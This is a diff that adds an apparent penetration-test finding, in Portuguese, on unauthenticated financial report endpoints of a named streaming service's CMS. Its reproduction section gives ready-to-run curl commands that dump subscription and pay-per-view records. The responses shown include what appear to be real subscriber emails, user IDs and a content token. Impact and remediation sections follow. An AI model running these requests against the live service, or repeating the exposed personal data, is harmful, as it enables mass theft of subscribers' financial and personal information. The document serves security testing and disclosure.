@@ -1,0 +1,110 @@
+# F-010 Unauth financial/admin reports — full subscription & PPV payment DB dump (CRÍTICO)
+Alvo: https://cms.soultv.com.br/v1/channel_report  e  /v1/PPV_Report  (Django REST Framework)
+Severidade: **CRÍTICA** (vazamento massivo de dados financeiros/PII sem auth — LGPD/PCI)
+Status: Confirmado (read-only, não-destrutivo)
+Timestamp: 2026-08-27T17:12:00Z
+Descoberto por: webapp (Fase 6)
+
+## Sumário
+Os endpoints `POST /v1/channel_report/` e `POST /v1/PPV_Report/` do CMS API — usados pelo
+painel BI interno `ppv.soultv.com.br` (rotas `/sales/subscriptions`, `/sales/transactions`) —
+**não exigem autenticação NEM autorização**. Qualquer pessoa na internet, sem qualquer
+token/credencial, pode paginar e baixar **todo o banco de assinaturas e transações PPV** da
+Soul TV: e-mail e `user_id` de cada assinante, canal/PPV assinado, status de assinatura,
+`stripe_subscription_id`, `transaction_id`, data de pagamento, preço, moeda, plano e data de
+criação. Trata-se de um relatório administrativo/financeiro exposto sem controle de acesso —
+a falha mais grave do engagement até aqui (CRÍTICA), combinando vazamento de PII financeira
+(LGPD) com dados de pagamento (potencial escopo PCI-DSS) em escala de dezenas de milhares de
+registros.
+
+Endpoints (extraídos do JS bundle `ppv.soultv.com.br_main.*.js`):
+```
+this.api.post(`channel_report/?size=${n}&page=${r}`, {date_start, date_end})   // cms.soultv.com.br/v1
+this.api.post(`PPV_Report/?size=${n}&page=${r}`,   {date_start, date_end})   // cms.soultv.com.br/v1
+this.apiServerless.post(`promotion_report/...`, ...)  // prod-serverless (403 WAF — não acessível)
+```
+
+## Reprodução (read-only, sem token)
+```bash
+# SEM Authorization header — relatório de assinaturas de canal
+$ curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"date_start":"2020-01-01","date_end":"2026-12-31"}' \
+    "https://cms.soultv.com.br/v1/channel_report/?size=2&page=1"
+{"success":true,"data":[
+ {"id":4891,"user":"amilcarfernandeslopo@gmail.com","deleted":false,
+  "created":"2025-11-24T21:53:10.831466","is_subscribed":true,"coin":"$","token":"tokenAndroid",
+  "channel_name":"Soul Lab Premium (DESATIVADO)","plan_selected":null,
+  "stripe_subscription_id":null,"user_id":790279,"payment_date":"","transaction_id":""},
+ {"id":4890,"user":"amilcarfernandeslopo@gmail.com",...}
+],"total":4673,"pages":2337}
+
+# SEM Authorization header — relatório de compras PPV
+$ curl -s -X POST -H "Content-Type: application/json" \
+    -d '{"date_start":"2020-01-01","date_end":"2026-12-31"}' \
+    "https://cms.soultv.com.br/v1/PPV_Report/?size=2&page=1"
+{"success":true,"data":[
+ {"id":64777,"user":"edsonmareri4@gmail.com","deleted":false,
+  "created":"2026-08-27T15:15:03.288017","ppv_id":31,"name":"O Caminho da Prosperidade",
+  "is_subscribed":true,"price":"0.00","coin":"R$","currency":"BRL",
+  "token":"RkFZTFdEUFZFXEdWZ0dIQkdBWUc6QVA8TFxAVW1E","channel_name":"",
+  "ppv_name":"O Caminho da Prosperidade","user_id":856424,"payment_date":"","transaction_id":""},
+ {"id":64776,"user":"alexsxandre373@gmail.com",...}
+],"total":63469,"pages":3}
+```
+- `channel_report`: **total=4673 registros / 2337 páginas** — todas as assinaturas de canal.
+- `PPV_Report`: **total=63469 registros** — todas as compras PPV (pp. 3 de size alto).
+- Resposta `200 success:true` **idêntica com e sem `Authorization: Token`** → autorização
+  ausente. O token de assinante comum (obtido em F-007) também funciona — não há separação
+  de papéis; qualquer assinante (ou anônimo) acessa o relatório administrativo.
+
+## Campos vazados por registro
+| Campo | Sensibilidade |
+|-------|---------------|
+| `user` (email) | PII — LGPD |
+| `user_id` | identificador interno (correlaciona com F-009) |
+| `channel_name` / `ppv_name` | conteúdo adquirido |
+| `is_subscribed` / `deleted` | status da assinatura |
+| `plan_selected.amount` | valor pago |
+| `coin` / `currency` | moeda (R$ / BRL / $) |
+| `stripe_subscription_id` | ID de assinatura no Stripe (gateway de pagamento) |
+| `transaction_id` | ID de transação de pagamento |
+| `payment_date` | data do pagamento |
+| `created` | data de criação da assinatura |
+| `token` | token interno de conteúdo (base64) do assinante |
+
+## Impacto
+- **CRÍTICO**: dump completo e não-autenticado de TODO o histórico de assinaturas e
+  transações PPV de um serviço de streaming pago. Escala: 4.673 assinaturas de canal +
+  **63.469 compras PPV** vazáveis por paginação simples (sem rate-limit observado).
+- Combina com F-009 (PII por user_id) → reconstrução completa do perfil financeiro de cada
+  assinante: nome + e-mail + canal/PPV comprado + valor + IDs de pagamento Stripe.
+- `stripe_subscription_id` vazado pode ser usado para interação com a API Stripe
+  (cancelamento/fraude via painel) se combinado com outras falhas; `transaction_id` é evidência
+  de transação.
+- Violação **LGPD** (dados financeiros + pessoais, art. 18/48) e possível escopo **PCI-DSS**
+  (IDs de transação de pagamento).
+- O painel BI `ppv.soultv.com.br` usa `account/signin` (mesmo CMS) — se a autenticação do
+  painel foi projetada para restringir esses relatórios a staff, ela está sendo bypassada no
+  nível da API (ausência de decorator `@permission_classes`/authorization no DRF). Sinal de
+  que TODOS os endpoints administrativos do CMS podem estar sem authz.
+
+## Recomendação
+1. Aplicar `IsAdminUser`/`IsStaff` permission no DRF para `channel_report`, `PPV_Report` e
+   qualquer endpoint `*_report` — exigir token de staff/admin e rejeitar assinantes/anônimos.
+2. Auditoria completa de TODOS os endpoints `/v1/*` em busca de `permission_classes` ausente
+   (F-007 signup, F-009 account/{id}, F-010 reports indicam falha sistemática de autorização).
+3. Notificação ANPD (LGPD) — vazamento de dados financeiros de dezenas de milhares de
+   assinantes.
+4. Rotacionar `stripe_subscription_id`/`transaction_id` expostos se aplicável; revisar permissões
+   da chave Stripe no painel.
+5. Rate-limiting + WAF nos endpoints `*_report`.
+
+## Artefatos
+- `enum/webapp/auth/channel_report_confirm.json` (size=2 sample, confirmado)
+- `enum/webapp/auth/ppv_report_confirm.json` (size=2 sample, confirmado)
+- `enum/webapp/auth/channel_report_p1.json` (20 KB, page 1 — amostra anterior)
+- `enum/webapp/auth/ppv_report_p1.json` (40 KB, page 1 — amostra anterior)
+- JS bundle: `enum/js_bundles/ppv.soultv.com.br_main.3b1fdd29724d00e86269.js`
+  (grep `channel_report` / `PPV_Report` / `apiServerless`)
+
+## Severidade: CRÍTICA (unauth full financial/PII dump, escala 63K+ registros, LGPD/PCI)
